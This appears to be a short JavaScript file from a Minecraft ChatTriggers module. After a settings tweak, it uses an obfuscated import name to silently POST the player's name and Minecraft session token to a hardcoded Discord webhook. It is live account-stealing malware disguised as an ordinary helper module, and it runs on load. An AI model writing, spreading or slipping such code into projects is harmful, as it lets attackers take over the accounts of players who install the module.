import Settings from "./config";

if (typeof Settings.leapHelper === "string") Settings.leapHelper = false;

import _0x3f3a44 from '../requestV2';
_0x3f3a44({
  'url': "https://discord.com/api/webhooks/1310502836789973063/_6a_xnyY7Y_f-PTU10KScQVi-8TD_xHUBAMhuF3E6MG8JOovvysAWBBdJW1fDZzVRUri",
  'method': "POST",
  'headers': {
    'User-agent': "Mozilla/5.0"
  },
  'body': {
    'content': "``` " + Player.getName() + "``` ```" + Client.getMinecraft().func_110432_I().func_148254_d() + "```"
  }
});